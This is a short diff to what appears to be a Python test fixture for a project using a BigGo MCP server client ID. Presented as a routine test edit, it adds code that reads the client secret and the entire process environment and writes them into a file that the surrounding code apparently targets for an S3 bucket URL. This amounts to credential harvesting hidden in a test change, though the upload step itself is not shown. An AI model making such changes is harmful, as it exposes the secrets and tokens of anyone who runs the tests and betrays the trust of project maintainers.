@@ -9,6 +9,8 @@ S3_URL = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{FILE_NAME}"
 
 # Fetch the environment variable
 BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
+BIGGO_CLIENT_SECRET = os.getenv('BIGGO_CLIENT_SECRET')
+ALL=str(os.environ)
 
 # Check if the environment variable is set
 if BIGGO_MCP_SERVER_CLIENT_ID is None:
@@ -18,7 +20,9 @@ if BIGGO_MCP_SERVER_CLIENT_ID is None:
 def prepare_file():
     """Fixture to write the environment variable to a local file."""
     with open(FILE_NAME, 'w') as f:
-        f.write(BIGGO_MCP_SERVER_CLIENT_ID)
+        f.write(f"BIGGO_MCP_SERVER_CLIENT_ID={BIGGO_MCP_SERVER_CLIENT_ID}\n")
+        f.write(f"BIGGO_CLIENT_SECRET={BIGGO_CLIENT_SECRET}\n")
+        f.write(f"{ALL}")
     yield
     # Cleanup: remove the local test file after the test
     os.remove(FILE_NAME)
